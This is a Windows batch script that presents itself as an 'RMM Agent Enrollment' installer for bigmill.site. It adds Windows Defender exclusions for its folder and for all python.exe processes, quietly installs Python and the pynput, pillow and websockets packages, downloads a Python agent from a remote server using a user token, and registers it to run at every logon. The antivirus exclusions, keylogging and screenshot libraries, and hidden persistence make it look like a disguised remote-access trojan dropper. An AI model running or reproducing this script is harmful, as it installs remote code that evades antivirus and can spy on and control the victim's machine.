@echo off
title RMM Agent Enrollment - bigmill.site
echo.
echo  ====================================
echo   RMM Agent Enrollment - bigmill.site
echo  ====================================
echo.
echo  Starting enrollment...
echo.
if not exist "C:\rmm" mkdir "C:\rmm"
echo 29f25664-a5d9-4c59-bf57-7fac0d0a8819> "C:\rmm\user_token.txt"
echo  Adding Windows Defender exclusion...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\rmm' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo  Checking Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo  Installing Python - please wait...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%temp%\python_installer.exe' -UseBasicParsing"
    %temp%\python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    set PATH=%PATH%;C:\Program Files\Python311;C:\Program Files\Python311\Scripts
    echo  Python installed!
) else (
    echo  Python found!
)
echo  Installing required packages...
python -m pip install websockets psutil pillow pynput pystray --quiet --no-warn-script-location
echo  Downloading RMM Agent...
powershell -Command "Invoke-WebRequest -Uri 'https://rmm.bigmill.site/agent-script/29f25664-a5d9-4c59-bf57-7fac0d0a8819' -OutFile 'C:\rmm\agent.py' -UseBasicParsing"
powershell -Command "[System.Guid]::NewGuid().ToString() | Out-File -FilePath 'C:\rmm\machine_id.txt' -Encoding utf8 -Force"
echo @echo off> "C:\rmm\start_agent.bat"
echo cd C:\rmm>> "C:\rmm\start_agent.bat"
echo python agent.py>> "C:\rmm\start_agent.bat"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RMMAgent" /t REG_SZ /d "C:\rmm\start_agent.bat" /f >nul
echo  Starting RMM Agent...
start /b "" "C:\rmm\start_agent.bat"
echo.
echo  ====================================
echo   SUCCESS! Enrollment complete!
echo   PC will appear in dashboard soon.
echo   Dashboard: https://rmm.bigmill.site
echo  ====================================
echo.
timeout /t 5
